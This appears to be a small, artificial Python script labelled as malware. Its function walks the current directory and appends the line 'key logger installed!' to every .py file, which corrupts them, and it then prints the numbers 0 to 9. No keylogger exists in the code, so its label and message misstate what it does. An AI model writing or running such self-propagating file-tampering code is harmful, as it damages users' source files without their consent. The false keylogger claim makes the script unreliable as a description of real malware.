import os
def malware_code():
    for root, dirs, files in os.walk('.'):
        for file in files:
            if file.endswith('.py'):
                with open(os.path.join(root, file), 'a') as f:
                    f.write('key logger installed!\n')

if __name__ == '__main__':
    malware_code()
for i in range(10):
    print(i)